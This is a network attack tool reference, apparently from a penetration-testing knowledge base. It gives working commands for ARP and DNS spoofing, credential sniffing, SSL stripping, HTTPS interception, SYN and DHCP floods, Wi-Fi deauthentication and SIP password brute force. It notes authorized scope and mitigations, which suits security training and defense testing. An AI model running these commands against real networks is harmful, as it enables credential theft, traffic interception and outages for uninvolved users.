# Network Attacks (MITM/Sniffing/DoS/VoIP)

**English** · [简体中文](07-network-attacks.zh-CN.md)

> **When to read this file**: Read this file when a task involves man-in-the-middle attacks (MITM), ARP/DNS/DHCP spoofing, traffic sniffing and credential interception, SSL/TLS stripping, DoS stress testing, VoIP/SIP auditing, or Cisco/routing protocol attacks.

## Quick Decision Table

| Task scenario | Preferred tool | Alternative | Key difference |
|---|---|---|---|
| ARP spoofing + sniffing in one | bettercap | ettercap | bettercap is modular and supports WiFi/BLE; ettercap has a long-established plugin ecosystem |
| ARP spoofing (lightweight combo) | arpspoof + dsniff/driftnet | ettercap | the dsniff suite bundles arpspoof; this combo saves the most resources |
| Cleartext credential sniffing | dsniff | tshark -Y filter | dsniff auto-recognizes 30+ protocols and prints usernames/passwords directly |
| Packet capture/offline analysis | tshark | tcpdump, netsniff-ng | tshark has display filters and field extraction; tcpdump is lighter and more general |
| TCP stream reassembly and recovery | tcpflow | tshark -z follow | tcpflow automatically saves each stream as a separate file |
| DNS spoofing | dnschef / bettercap dns.spoof | dnsspoof (dsniff), ettercap dns_spoof | dnschef is a standalone proxy that is easy to control; bettercap integrates it natively |
| HTTPS MITM (with CA trust) | mitmproxy | sslsplit, bettercap https.proxy | mitmproxy is interactive and lets you modify packets; sslsplit is a transparent proxy suited to full traffic |
| IPv6-side MITM (AD domain) | mitm6 | bettercap | mitm6 abuses the default Windows DHCPv6 configuration to take over DNS |
| Phishing-style MITM / 2FA bypass | evilginx2 | fluxion (wireless) | evilginx2 reverse-proxies and steals session cookies |
| Craft/send arbitrary packets | scapy | hping3, hexinject, t50 | scapy is a programmable Python library; hping3 is the fastest on the command line |
| Layer-2 attacks (STP/DHCP/CDP) | yersinia | bettercap, dhcpig | yersinia covers the widest protocol range; dhcpig specializes in DHCP exhaustion |
| HTTP slow DoS testing | slowhttptest | goldeneye, siege | slowhttptest covers 4 classes of slow attacks; goldeneye is a concurrent-connection flood |
| Network-layer stress testing | hping3 | t50 | hping3 offers fine-grained TCP flag control; t50 has high multi-protocol injection throughput |
| SSL handshake stress testing | thc-ssl-dos | — | exploits the asymmetric cost of TLS renegotiation (15x on the server) |
| SIP server discovery | svmap | sippts scan | svmap is the sipvicious suite entry point; sippts is newer and more complete |
| SIP extension enumeration/brute force | svwar / svcrack | sippts exten / rcrack | same as above; choose per suite preference |
| SIP stress testing | inviteflood | sipp, iaxflood (IAX) | inviteflood floods a fixed target with INVITEs; sipp can orchestrate complete call scenarios |
| RTP stream analysis/injection | rtpbreak | sippts rtpbleed* | rtpbreak rebuilds sessions into files; sippts detects the RTP Bleed vulnerability |
| Cisco device scanning | cisco-torch | cisco-ocs | cisco-torch is multi-process with fingerprinting; cisco-ocs is plain IP-range batching |
| Cisco config theft (SNMP) | copy-router-config.pl | — | requires an rw community + a local TFTP service |
| Cisco exploitation | cge.pl | — | ships 20+ old IOS vulnerability numbers, triggered by number |
| VoIP VLAN hopping | voiphopper | — | discovers the voice VLAN via CDP/DHCP and joins it |
| MAC spoofing | macchanger | bettercap mac.changer module | macchanger is the simplest single-purpose option |

## Core Tools in Depth

### bettercap — All-in-One Modular MITM/Recon Framework

**Purpose**: A Swiss-army-knife framework that unifies host discovery (net.probe/net.recon), ARP spoofing (arp.spoof), sniffing (net.sniff), DNS spoofing (dns.spoof), HTTP(S) proxies (http.proxy/https.proxy), SYN scanning (syn.scan), and other modules in one place; it also covers WiFi/BLE/GPS recon.
**Installation**: `sudo apt install bettercap`
**When to use**: When you need to chain "spoofing + sniffing + injection" into one pipeline and frequently switch attack targets, bettercap is the first choice, avoiding multi-process assembly with arpspoof/dsniff/dnschef; it is also the only one that supports unified WiFi and wired attacks.

```bash
sudo bettercap -iface eth0

# 进入交互式会话后(help 查看全部命令,get/set 管理变量):
net.probe on            # 主动探测网段内主机
net.show                # 列出发现的端点(IP/MAC/厂商/流量)
set arp.spoof.targets <victim-ip>   # 指定欺骗目标(默认整个网段)
arp.spoof on            # 启动 ARP 毒化
net.sniff on            # 嗅探并自动解析凭据(http/ftp/imap/smtp 等)

# DNS 欺骗组合
set dns.spoof.domains <domain>
set dns.spoof.address <attacker-ip>
dns.spoof on

# SSL 剥离(经 http.proxy)
set http.proxy.sslstript true   # 注意参数名就是 sslstript
http.proxy on

# 一键脚本(caplet)方式运行
sudo bettercap -iface eth0 -caplet <file.cap>
```

**Practical tips**:
- When spoofing gateway-bound traffic, kernel forwarding must be enabled: `echo 1 > /proc/sys/net/ipv4/ip_forward` (same applies to ettercap/arpspoof).
- Caplets are loaded automatically; `caplets.update` updates them online, and the built-in `hstshijack` caplet is used for HSTS hijack stripping.
- Credential events captured by `net.sniff` can also be viewed through `events.stream`; use `! <shell command>` to run system commands inside the session.
- Always run `arp.spoof off` when stopping the attack so the target's ARP table returns to normal; this avoids a broken network after testing.

### arpspoof — Lightweight ARP Spoofing (dsniff Suite)

**Purpose**: Continuously sends forged ARP replies to the target, inserting itself into the forwarding path between victim↔gateway; it is the first step of the classic "ARP spoofing + sniffing" combo.
**Installation**: `sudo apt install dsniff` (arpspoof is a member of the dsniff package)
**When to use**: When you only want plain traffic forwarding paired with external sniffers such as dsniff/driftnet/tcpdump and do not need bettercap's full framework; also a better fit for resource-constrained pivoting hosts.

```bash
# 1. 开启内核 IP 转发(必须,否则目标断网)
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. 欺骗 victim:"我是网关"
arpspoof -i eth0 -t <victim-ip> <gateway-ip>

# 3. 另开终端做反方向,保证双向流量都经过攻击机
arpspoof -i eth0 -t <gateway-ip> <victim-ip>

# 之后并行挂任意嗅探器:
dsniff -i eth0          # 明文凭据
driftnet -i eth0        # 图片
tcpdump -i eth0 -w mitm.pcap
```

**Practical tips**:
- With only one direction running (step 2), victim→gateway traffic blackholes and the target becomes noticeably laggy; always run both directions.
- When `arpwatch` runs on the target segment it reports your MAC/IP changes by email — a common blue-team technique for detecting ARP spoofing.
- On Ctrl+C exit arpspoof restores the original mappings, but some systems need a manual `ip neigh flush` or must wait for the ARP timeout.
- This attack fails when switch port security (Dynamic ARP Inspection / port-security) is enabled.

### dsniff — Cleartext Credential Sniffing Suite

**Purpose**: Passively sniffs and automatically parses usernames/passwords, emails, URLs, and files from dozens of protocols; the suite also bundles companion tools such as arpspoof, dnsspoof, macof, tcpkill, and webspy.
**Installation**: `sudo apt install dsniff`
**When to use**: When you are already in the traffic path (hub environment, mirror port, or combined with arpspoof) and want zero-configuration credential output; less effort than hand-writing tshark filters, but covers only cleartext protocols.

```bash
dsniff -i eth0                  # 主嗅探器,-m 自动检测协议
urlsnarf -i eth0                # 输出受害者访问的 URL(常见日志格式)
mailsnarf -i eth0               # 重组并打印邮件内容
msgsnarf -i eth0                # 捕获即时消息/聊天内容
filesnarf -i eth0               # 提取 NFS/SMB 等传输中的文件
webspy -i eth0 <victim-ip>      # 把受害者浏览的 URL 实时发到本机浏览器

# DNS 欺骗:伪造 hosts 文件中的域名解析
dnsspoof -i eth0 -f <hosts-file>    # 文件格式同 /etc/hosts

# 交换机 CAM 表溢出(使其退化为 hub,便于被动嗅探;噪音大易被发现)
macof -i eth0

# 杀掉指定主机的 TCP 连接
tcpkill -i eth0 host <victim-ip>
```

**Practical tips**:
- All tools work only on cleartext protocols (HTTP/FTP/POP3/SMTP/TELNET, etc.); in the HTTPS era their main value is legacy intranet devices and protocol auditing.
- `dsniff -m` avoids trial and error per protocol when traffic is mixed; the output format is `protocol: user/pass`.
- dnsspoof's hosts file supports wildcard DNS for a whole domain, e.g. `192.168.1.50\t*.example.com`.
- macof sends thousands of forged-MAC packets per second; it is highly destructive on production networks — use with caution within the authorized scope.

### driftnet — Extract and Display Images from Traffic

**Purpose**: Watches TCP streams, pulls out JPEG/GIF and other images transmitted in them in real time and pops them up for display — an intuitive proof that "the traffic can be read".
**Installation**: `sudo apt install driftnet`
**When to use**: Visual demos/reporting once ARP spoofing is in place (screenshot evidence); combined with urlsnarf to present the victim's browsing behavior.

```bash
driftnet -i eth0                 # 弹窗实时显示嗅到的图片
driftnet -i eth0 -a -d /tmp/driftnet   # -a 附属模式:不弹窗,图片落盘并在 stdout 打印文件名
```

**Practical tips**:
- You must already be in the traffic path: hub, SPAN port, or after arpspoof/ettercap spoofing; otherwise you can barely capture anyone else's streams on a switched network.
- `-a` adjunct mode only prints filenames without displaying — good for scripted archiving.
- Hit rates are limited now that HTTPS is widespread; it works best on intranet systems/IoT devices still using HTTP.

### ettercap — Multipurpose Sniffing/Interception/Logging Framework (Switched LAN)

**Purpose**: Supports active/passive dissection of many protocols with built-in ARP spoofing, port stealing, packet filtering, and injection; its plugin system includes classic plugins such as dns_spoof.
**Installation**: `sudo apt install ettercap-text-only` (console version) / `sudo apt install ettercap-graphical` (GUI version)
**When to use**: When you need more automated bidirectional ARP MITM than arpspoof, or want filters (.ef files) to modify packets or cut flows in real time; a veteran and stable choice, but after the HTTP era its credential-capture capability is weaker than bettercap's.

```bash
# 文本模式 ARP 双向欺骗:victim ↔ gateway
sudo ettercap -T -i eth0 -M arp:remote /<victim-ip>/ /<gateway-ip>/

# 欺骗整个网段(两个空目标)
sudo ettercap -T -i eth0 -M arp:remote // //

# 加载 DNS 欺骗插件(先编辑 /etc/ettercap/etter.dns 指定域名→IP)
sudo ettercap -T -M arp:remote -P dns_spoof /<victim-ip>/ //

# 交互界面内:p 列出/加载插件,s 保存流量,q 退出
```

**Practical tips**:
- Target syntax is `/MAC/IPs/PORTs`, e.g. `/192.168.1.0-254/ 80`; `arp:remote` means it also sniffs remote traffic forwarded through the gateway.
- In ettercap 0.8+, unified sniffing disables kernel IP forwarding by default and handles forwarding itself; ARP is restored automatically on exit — after an abnormal exit you must restore manually.
- Filters must first be compiled with etterfilter: `etterfilter <filter.ef> -o <filter.ef.out>`, then loaded with `-F`.
- Debian package split: a three-piece set of ettercap-common (data files), ettercap-text-only, and ettercap-graphical.

### mitmproxy — Programmable HTTPS Man-in-the-Middle Proxy

**Purpose**: An interactive HTTP/HTTPS MITM proxy for viewing, modifying, and replaying requests in real time; mitmdump provides a headless command-line mode and supports Python scripts (hooks) for automatic packet modification.
**Installation**: `sudo apt install mitmproxy`
**When to use**: Web application-layer testing (modifying requests/responses, testing session logic) and capturing API traffic; compared with sslsplit it leans toward "human viewing/editing", while sslsplit leans toward "full capture to disk".

```bash
# 官网示例:显式代理监听 2139 端口
mitmproxy -p 2139

# 命令行模式:透明代理 + 全量写文件
mitmdump --mode transparent -w <file>

# 反向代理模式:前置到指定后端
mitmdump --mode reverse:http://<backend-host> -p 8080

# 挂载改包脚本(脚本内实现 request/response 钩子)
mitmdump -s <script.py> -p 8080

# 透明模式需要 iptables 把 80/443 重定向过来:
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
```

**Practical tips**:
- HTTPS decryption requires the client to trust its CA (generated on first launch in `~/.mitmproxy/`, certificate file `mitmproxy-ca-cert.cer`); mobile testing often just installs that certificate.
- Interactive shortcuts: Enter opens flow details, Tab switches request/response, `e` edits, `r` replays.
- Without installing the CA certificate you can fall back to cleartext HTTP and SSL-stripping-style testing only.

### sslsplit — Transparent SSL/TLS Interception with Full Capture to Disk

**Purpose**: A transparent MITM tool for SSL/TLS connections: connections hijacked via NAT/iptables are terminated here and re-established to the real destination, with all cleartext data written to disk by connection/type — suited to forensics and full recording.
**Installation**: `sudo apt install sslsplit`
**When to use**: When you need to "indiscriminately record all hijacked traffic" (including non-HTTP TLS protocols such as SMTPS/IMAPS/FTP over TLS) and can control the victim's trust anchor (pre-installed CA).

```bash
# 生成自签 CA(受害者需导入信任 ca.crt)
openssl req -new -x509 -keyout ca.key -out ca.crt -days 3650 -nodes

# 官网示例:调试模式,日志/内容分目录,SSL 8443、明文 8080
sslsplit -D -l connections.log -j /tmp/sslsplit/ -S /tmp/ -k ca.key -c ca.crt \
  ssl 0.0.0.0 8443 tcp 0.0.0.0 8080

# 配合 iptables 把网关角色的流量转发进来:
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443
```

**Practical tips**:
- `-S <dir>` saves decrypted content in directories organized by "date/connection"; the connection log lives in the `-l` file, for timeline-based forensics when reporting.
- Combined with arpspoof it forms the complete "ARP spoofing → transparent HTTPS interception" chain; without the CA installed, clients raise certificate warnings.
- Afterwards always flush the nat table rules: `iptables -t nat -F`.
- `-D` debug mode prints detailed connection info for troubleshooting; drop it for long production runs.

### dnschef — Penetration-Testing-Oriented DNS Proxy (Fake DNS)

**Purpose**: A highly configurable DNS proxy: by default it forwards everything as a proxy, you can direct certain domains to resolve to forged IPs, or take over entirely (fakes everything).
**Installation**: `sudo apt install dnschef`
**When to use**: For targeted domain spoofing from a MITM position (hijacking port 53 after arpspoof, forging the DNS handed out by DHCP, or locally testing malware C2 resolution); more fine-grained control than dnsspoof.

```bash
# 无参数 = 纯代理模式(官网示例行为)
dnschef

# 把指定域名的解析伪造成 attacker-ip
dnschef --fakeip <attacker-ip> --fakedomains <domain1>,<domain2> --interface <listen-ip>

# 劫持所有域名(配合受害者 DNS 指向本机)
dnschef --fakeip <attacker-ip> --interface <listen-ip>

# 让 mitm 位置上的 53 端口流量落到 dnschef:
iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to <attacker-ip>
```

**Practical tips**:
- Queries not listed in `--fakedomains` are forwarded to the real upstream as usual (default 8.8.8.8, changeable with `--nameservers`), leaving the victim's other browsing unaffected — good stealth.
- Choose between this and bettercap's dns.spoof: the former is a standalone process that is easy to orchestrate; the latter links with arp.spoof inside the same session.

### mitm6 — Taking Over Windows DNS via IPv6 (DHCPv6)

**Purpose**: Exploits the fact that Windows enables IPv6 by default and prefers DHCPv6; it answers DHCPv6 requests to set itself as the victim's default DNS server, hijacking intranet name resolution (commonly used in AD relay attack chains).
**Installation**: `sudo apt install mitm6`
**When to use**: When the target intranet has a Windows domain environment and you want to bypass IPv4-layer protections for NTLM relaying (WPAD/proxy hijacking); this is a second path beyond IPv4 MITM.

```bash
# 最常用:针对指定域名接管 DNS
sudo mitm6 -i eth0 -d <ad-domain>

# -r 指定认证中继目标(与 ntlmrelayx 配合,用作假 DNS 主机名触发 Kerberos 认证)
sudo mitm6 -i eth0 -d <ad-domain> -r <target>

# 只攻击特定主机用 -hw/--host-allowlist
sudo mitm6 -i eth0 -d <ad-domain> -hw <fqdn>

# 经典组合:mitm6 抓到认证后交给 impacket 的 ntlmrelayx 中继(需另装 impacket)
sudo ntlmrelayx.py -6 -wh wpad.<ad-domain> -l <loot-dir>
```

**Practical tips**:
- mitm6 only takes over DNS and does not decrypt traffic itself; the real damage is that "intranet name resolution gets directed to attacker-controlled services".
- Key mitigations: disabling WPAD domain-wide, global query blocklist protection, disabling DHCPv6 where RA guard is missing, etc.; the test report should verify these configurations.
- It periodically renews DHCPv6 leases; after the tool is interrupted, the victim's IPv6 DNS must wait for lease expiry or a manual refresh.

### tshark / wireshark — Command-Line Capture and Deep Protocol Analysis

**Purpose**: The Wireshark family's CLI; tshark supports capture filters (-f, BPF syntax), display filters (-Y, wireshark syntax), field extraction (-T fields), and statistics (("-z")), with the broadest protocol dissector coverage.
**Installation**: `sudo apt install tshark` (pre-installed on Kali; GUI version `sudo apt install wireshark`)
**When to use**: Precise forensics from a MITM position; offline pcap analysis; exporting protocol fields as CSV for script processing. The GUI (wireshark) suits manual stream tracing, tshark suits automation.

```bash
# 官网示例:BPF 捕获过滤器
tshark -f "tcp port 80" -i eth0

# 抓包存盘
tshark -i eth0 -w <file>.pcap

# 提取 HTTP 请求(显示过滤器 + 字段导出)
tshark -i eth0 -Y 'http.request' \
  -T fields -e ip.src -e http.host -e http.request.uri

# 离线 pcap 提取 FTP 凭据
tshark -r <file>.pcap \
  -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' \
  -T fields -e ip.src -e ftp.request.command -e ftp.arg

# 重组 TCP 流(第 0 条,ASCII 视图)
tshark -r <file>.pcap -q -z follow,tcp,ascii,0

# 协议层级统计/会话统计
tshark -r <file>.pcap -q -z io,phs
tshark -r <file>.pcap -q -z conv,ip
```

**Practical tips**:
- `-f` (kernel-level BPF, filtering before capture) and `-Y` (filtering after capture with wireshark syntax) differ semantically; the combination `-f "port 5060" -Y "sip"` is a common VoIP analysis pattern.
- Credential filter quick reference: HTTP Basic → `http.authorization`; SIP Digest → `sip.Proxy-Authorization` (subfields `sip.auth.username` / `sip.auth.digest.response`); Kerberos → `kerberos.CNameString`.
- In high-traffic scenarios write to disk with `-w` first and analyze offline, to avoid real-time parsing dropping packets.
- Both filter types are also available in the GUI capture options; stratoshark (Wireshark family) is for syscall/log analysis.

### tcpdump — Lightweight Command-Line Capture

**Purpose**: The classic CLI sniffer with BPF filtering, ASCII/hex printing, and pcap writing; in almost any environment you can capture evidence with it first.
**Installation**: Pre-installed on Kali (`sudo apt install tcpdump`)
**When to use**: Quickly verifying whether spoofing took effect, capturing minimal pcaps, resource-constrained or tshark-less environments; paired with arpspoof as a general-purpose recorder.

```bash
tcpdump -i eth0 -w <file>.pcap                 # 抓包存盘
tcpdump -i eth0 -nn host <ip> and port 80      # 按主机+端口过滤,-nn 禁用名称解析
tcpdump -i eth0 -A -s0 'tcp port 80'           # ASCII 显示 HTTP 内容,-s0 不截断
tcpdump -r <file>.pcap 'arp'                   # 离线只看 ARP(验证 ARP 欺骗)
tcpdump -i eth0 'icmp[icmptype] = 8'           # 仅 ICMP echo request(扫活指纹)
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' # 仅 SYN 包(端口扫描观察)
```

**Practical tips**:
- Verify ARP poisoning: `tcpdump -i eth0 -e arp`; repeated is-at replies mean spoofed packets are being sent.
- `-e` shows link-layer MACs — essential for working out the spoofing direction (who is impersonating whom).
- Its pcap output is fully interoperable with tshark/wireshark, forming a "tcpdump capture → tshark analysis" pipeline.

### tcpflow — TCP Stream Reassembly Recorder

**Purpose**: Reassembles complete data streams per TCP connection and saves one file per stream, handling retransmits/out-of-order correctly; suited to reading cleartext content "session by session".
**Installation**: `sudo apt install tcpflow`
**When to use**: When you have a pcap or live traffic and want to directly see each connection's complete payload (e.g. recovering HTTP messages, exporting transferred content); more automated than clicking through tshark follow one by one.

```bash
tcpflow -i eth0 -c                 # 实时嗅探,-c 直接打印到终端
tcpflow -r <file>.pcap             # 离线重组 pcap 内所有流
tcpflow -i eth0 host <victim-ip>   # 只记录指定主机
```

**Practical tips**:
- Output filenames look like `source-IP.port-destination-IP.port`; grepping for sensitive strings in time order is very convenient.
- The default output directory is the current working directory; run `mkdir <dir> && cd <dir>` first.
- It reassembles TCP only; handle UDP (DNS/SIP) content with tshark.

### scapy — Python Packet Crafting/Sniffing/Scanning Library

**Purpose**: An interactive packet workshop: define arbitrarily layered packets, send them, and match replies; can replace the combination of hping, most nmap uses, arpspoof, arping, and tcpdump.
**Installation**: `sudo apt install python3-scapy`
**When to use**: When you need fine-grained/programmatic packet control (custom protocols, malformed-packet fuzzing, automated scanning scripts), or to do "send + receive + compare" in one shot; more flexible than CLI tools but slower.

```bash
sudo scapy

# ARP 存活扫描(经典)
ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"), timeout=2)
ans.summary(lambda s: s[1].sprintf("%ARP.psrc%  %Ether.src%"))

# SYN 探测端口
sr1(IP(dst="<ip>")/TCP(dport=80, flags="S"), timeout=2)

# ICMP 探测/压测
send(IP(dst="<ip>")/ICMP(), loop=1, inter=0)

# 离线读 pcap
pkts = rdpcap("<file>.pcap"); pkts.summary()

# 脚本内使用
# from scapy.all import *
```

**Practical tips**:
- `sr/srp` send and receive in pairs, `send/sendp` only send, `sr1` takes the first reply; for layer-2 packets (Ether) use the `p`-suffixed variants.
- Promiscuous forwarding is not enabled by default; MITM still requires system-level IP forwarding.
- On large-scale scans mind `timeout` and `verbose=0`, otherwise output floods the screen and the session hangs.
- Official description: it can replace hping, 85% of nmap, arpspoof, arping, tcpdump, p0f, etc. — but for engineering-grade scenarios, dedicated tools are still recommended.

### yersinia — Layer-2 Protocol Attack Framework

**Purpose**: An attack/testing framework for layer-2 protocols such as STP, CDP, DHCP, DTP, VTP, 802.1Q, 802.1X, and HSRP; it can launch DHCP exhaustion, STP root-bridge takeover, CDP flooding, and more.
**Installation**: `sudo apt install yersinia`
**When to use**: Assessing switched-network robustness: verifying whether protections such as port security, DHCP Snooping, and BPDU Guard are in place; a single tool covering nearly all layer-2 protocols.

```bash
sudo yersinia -I                        # 交互式(ncurses)界面
sudo yersinia -G                        # GTK 图形界面
sudo yersinia -protocol DHCP -attack 1  # DHCP DISCOVER 耗尽攻击(耗尽地址池)
sudo yersinia -protocol STP -attack 4   # 发送 BPDU 抢占根桥(拓扑震荡)
```

**Practical tips**:
- In interactive mode press `h` for help, `x` to choose attacks, `l` to list protocols; for non-interactive `-attack <id>`, see the man page for each protocol's ID meanings.
- STP/DHCP attacks disrupt whole-network availability in real time; run them only on an authorized isolated segment.
- Defense verification points: with DHCP Snooping + Dynamic ARP Inspection (DAI), BPDU Guard, and port security enabled, the corresponding attacks should fail — that failure is itself the test conclusion.

### hping3 — Scriptable TCP/UDP/ICMP Packet Crafter

**Purpose**: Sends customized ICMP/UDP/TCP packets and displays replies like ping; usable for firewall rule testing, spoofed-source scanning, path MTU, stack auditing, and stress testing.
**Installation**: `sudo apt install hping3`
**When to use**: When you need to quickly craft packets with specific flags/fragments/payloads on the command line (lighter than scapy, finer-grained than t50); also the classic SYN/ICMP flood stress-testing tool.

```bash
# 官网示例:ICMP 模式 traceroute
hping3 --traceroute -V -1 www.example.com

# 对 80 端口 SYN 洪水压力测试(随机源地址)
hping3 -S -p 80 --flood --rand-source <target>

# 单发 SYN 探测端口开放情况
hping3 -S -p <port> -c 1 <target>

# 伪造源地址发包(测试防火墙/反向路径过滤)
hping3 -S -a <spoof-ip> -p <port> <target>
```

**Practical tips**:
- `-0/-1/-2` are raw IP/ICMP/UDP modes respectively, default TCP; `-c` limits the packet count, `--flood` sends at full speed without waiting for replies.
- `--rand-source` trips IDS quickly, so stress testing doubles as a detection-capability check.
- The old Tcl script interface (hping3's interactive mode) is rarely used now; command-line arguments cover daily needs.

### t50 — Multi-Protocol High-Speed Packet Injector

**Purpose**: A high-performance packet injection tool supporting 15 protocols (TCP/UDP/ICMP/IGMP/RIP/DCCP/PIM, etc.), concurrent and multi-threaded; suited to stress-testing network devices and protocol-stack robustness.
**Installation**: `sudo apt install t50`
**When to use**: Protocol-layer stress and stability testing of routers/firewalls and other network devices; beats hping3 when throughput demands are high.

```bash
# 官网示例:默认协议(TCP)洪水注入,Ctrl+C 停止
t50 --flood <target>

# 限定发送总包数(--threshold 默认 1000,避免直接打瘫)
t50 --threshold 100 <target>
```

**Practical tips**:
- `--threshold` caps the total packets sent (default 1000); `--flood` ignores that cap and keeps injecting, instantly saturating the link — use `--threshold` for production tests.
- It supports stacking multiple protocol headers at once (fingerprint), for testing device parsing anomalies.
- In joint testing with IDS/IPS you can observe detection rates; T50's traffic signature is obvious and easily fingerprinted.

### slowhttptest — Application-Layer Slow DoS Simulation

**Purpose**: Simulates low-bandwidth application-layer DoS such as slowloris across four classes — slow headers, slow POST, Range attack, and slow read — to verify web server timeout and connection-limit configuration.
**Installation**: `sudo apt install slowhttptest`
**When to use**: Authorized availability stress testing of web services; compared with high-volume floods, slow attacks occupy the connection pool with minimal bandwidth — the point is verifying whether the server can be dragged down by a small number of connections.

```bash
# 官网示例:slowloris 模式(-H)压测目标
slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET \
  -u http://<target>/index.php -x 24 -p 3
```

**Practical tips**:
- Four modes: `-H` slow headers (slowloris), `-B` slow POST body, `-R` Range attack, `-X` slow read; start with `-H`, then switch modes per server type.
- `-g -o <prefix>` generates CSV/HTML statistics charts, ready for reports.
- The appearance of "service available: NO" means the service was dragged down; conclusions should include mitigation advice (cap concurrency, shorten header timeouts, put a reverse proxy in front).

### thc-ssl-dos — SSL/TLS Handshake Stress Testing

**Purpose**: Exploits the asymmetry where TLS renegotiation costs the server roughly 15x the client's compute, continuously initiating renegotiations to drag down HTTPS services.
**Installation**: `sudo apt install thc-ssl-dos`
**When to use**: Verifying HTTPS endpoints' resilience to handshake storms (rate limiting, WAF, renegotiation-disabling configuration).

```bash
# 官网示例:100 并发连接打 443
thc-ssl-dos -l 100 <target-ip> 443 --accept
```

**Practical tips**:
- It only works if the target allows renegotiation; after RFC 5746 many services disable or rate-limit renegotiation by default, and failing to move the target is itself a "pass" conclusion.
- The output's h/s (handshakes per second) and Err counts can be used directly for capacity comparison.

### goldeneye — HTTP Keep-Alive DoS Testing

**Purpose**: A concurrent stress tool based on HTTP Keep Alive and unlimited headers; it holds many occupied connections open with relatively little bandwidth to test web server configuration.
**Installation**: `sudo apt install goldeneye`
**When to use**: A "volume-oriented" HTTP stress test complementing slowhttptest: verifying connection-count limits, timeouts, and reverse-proxy buffering behavior.

```bash
goldeneye http://<target>/ -w 50 -s 500     # 50 个 worker × 500 socket
```

**Practical tips**:
- `-w` is concurrent workers and `-s` is sockets per worker; increase from small to large and watch for the inflection point.
- Use only against authorized targets; while firing, watch the connection table and load on the server side in parallel to form measurable conclusions.

### dhcpig — DHCP Address Pool Exhaustion (scapy Implementation)

**Purpose**: Launches advanced DHCP exhaustion: consumes all available IPs, blocks new users from getting addresses, releases in-use IPs, and fires concurrent gratuitous ARPs to knock Windows hosts offline.
**Installation**: `sudo apt install dhcpig`
**When to use**: Testing whether protections such as DHCP Snooping and port rate limiting work; the blast radius is the whole segment — run only in an isolated, authorized environment.

```bash
# 官网示例:耗尽 eth0 所在网段地址池(需 root)
pig.py eth0
```

**Practical tips**:
- Compared with yersinia's DHCP attack, it also actively releases others' leases and cuts connectivity with GARP — a more thorough "kill".
- Defense verification: with DHCP Snooping trusted ports correctly configured, DHCPRELEASE/DISCOVER from untrusted ports should be dropped.

### mdk3 — IEEE 802.11 Wireless Attack Tool

**Purpose**: A proof-of-concept tool exploiting Wi-Fi protocol-layer weaknesses: authentication floods, beacon floods, deauthentication, Michael resistance testing, and other wireless DoS techniques.
**Installation**: `sudo apt install mdk3`
**When to use**: Stress-verifying AP robustness in authorized wireless security assessments (note: deauthentication and similar attacks directly affect real users).

```bash
# 官网示例:认证 DoS 模式(a)——大量伪造客户端尝试认证
mdk3 wlan0 a

# 其他模式:b=beacon 泛洪、d=去认证、m=Michael 关断(完整列表:mdk3 --help)
```

**Practical tips**:
- First run `airmon-ng check kill` and put the card into monitor mode (see the wireless domain document); replace `wlan0` with the mon interface name.
- The later version in Kali is mdk4 (command-compatible, `mdk4 <iface> a`); authentication floods can make old APs reboot.
- Wireless DoS is clearly illegal in most jurisdictions; restrict it to authorized testing and your own lab environments.

### sipvicious (svmap/svwar/svcrack/svreport/svcrash) — SIP/VoIP Audit Suite

**Purpose**: A five-piece kit: `svmap` discovers SIP servers, `svwar` enumerates usable extensions, `svcrack` online-brute-forces extension passwords, `svreport` organizes results, and `svcrash` counters probing scanners.
**Installation**: `sudo apt install sipvicious`
**When to use**: The first step of intranet VoIP penetration: svmap to find the PBX, svwar to map extension ranges, then svcrack to brute force; a mature classic flow with the fastest ramp-up.

```bash
# 官网示例:扫网段找 SIP 服务器
svmap <cidr> -v                       # 例:svmap 192.168.1.0/24 -v

# 枚举有效分机(-e 指定号段,-m 选择方法)
svwar -m INVITE -e 100-999 <target>

# 对分机做密码爆破
svcrack -u <ext> -d <wordlist> <target>

# 汇总历史结果
svreport list
```

**Practical tips**:
- svwar uses OPTIONS by default; some PBXes only reveal extension-existence differences for INVITE, so run both methods.
- Brute forcing fills failed-login logs; keep the rate controlled within the authorized window (`--rate`-style parameters are in each tool's help).
- svcrash is for "kicking off" svmap scans by others against your own PBX — a defensive use.

### sippts — Modern SIP/VoIP Audit Toolkit

**Purpose**: A full Python SIP audit kit whose subcommands cover scanning, extension enumeration, password cracking, floods, spoofing, sniffing, and the RTP Bleed detection series: `scan exten rcrack send wssend enumerate leak ping invite dump dcrack flood sniff spoof pcapdump rtpbleed rtcpbleed rtpbleedflood rtpbleedinject astami video`.
**Installation**: `sudo apt install sippts`
**When to use**: The modern replacement for sipvicious: a must when you need RTP Bleed vulnerability detection, Asterisk configuration auditing (astami), or deep pcap processing.

```bash
# 网段发现 SIP 服务
sippts scan -i <cidr>

# 枚举分机
sippts exten -i <ip> -r 100-999

# RTP Bleed 漏洞检测(检测 PBX 是否可被注入/泄露 RTP)
sippts rtpbleed -i <ip>
```

**Practical tips**:
- `rtpbleed`/`rtcpbleed` correspond to CVE-2017-18041-class issues: media ports that do not validate the source let call audio be hijacked; attach fix advice after detection (bind to the signaling-negotiated address).
- `sniff`/`pcapdump` can write SIP sessions straight to disk, complementing rtpbreak.
- Every subcommand has full parameter documentation via `sippts <cmd> -h`.

### sipp — SIP Traffic Generator

**Purpose**: An open-source SIP stress-testing tool with built-in SipStone scenarios such as UAC/UAS; complex call flows can be orchestrated in XML, with real-time call-rate/latency/message statistics.
**Installation**: `sudo apt install sipp`
**When to use**: Capacity and stability testing of PBXes/softswitches (not destruction): simulating hundreds of concurrent calls to verify system specs.

```bash
# 官网示例:以内置 UAS 场景当被叫方
sipp -sn uas

# 作为主叫压测目标(默认 uac 场景,-r 呼叫速率)
sipp -sn uac -r 10 <target>

# 自定义场景文件
sipp -sf <scenario.xml> <target>
```

**Practical tips**:
- Press 1-9 to switch statistics views on screen; CSVs are written to disk periodically, handy for capacity reports.
